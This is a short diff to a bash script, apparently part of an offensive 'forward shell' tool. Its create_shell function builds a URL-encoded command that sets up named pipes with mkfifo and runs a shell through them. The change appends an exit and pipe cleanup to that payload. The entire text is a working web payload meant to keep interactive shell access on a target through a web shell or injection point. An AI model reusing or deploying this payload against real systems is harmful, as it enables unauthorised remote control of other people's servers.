@@ -422,7 +422,7 @@ create_shell() {
     local INIT_SHELL="$(get_config_value "INIT_SHELL")"
     if [[ "$INIT_SHELL" == "" ]]; then
         local SHELL_CUSTOM="$(get_config_value "SHELL_CUSTOM")"
-        shell="rm%20-f%20$FI%20$FO%3B%20mkfifo%20$FI%20$FO%3B%20$SHELL_CUSTOM%20-c%20%27exec%205%3C%3E$FI%3B%20cat%20%3C%265%7C%20$SHELL_CUSTOM%20%202%3E$FO%20%3E$FO%27";
+        shell="rm%20-f%20$FI%20$FO%3B%20mkfifo%20$FI%20$FO%3B%20$SHELL_CUSTOM%20-c%20%27exec%205%3C%3E$FI%3B%20cat%20%3C%265%7C%20$SHELL_CUSTOM%20%202%3E$FO%20%3E$FO%3Bexit%27%3Brm%20-f%20$FI%20$FO";
     else
         shell="$(urlencode "$INIT_SHELL")"
     fi
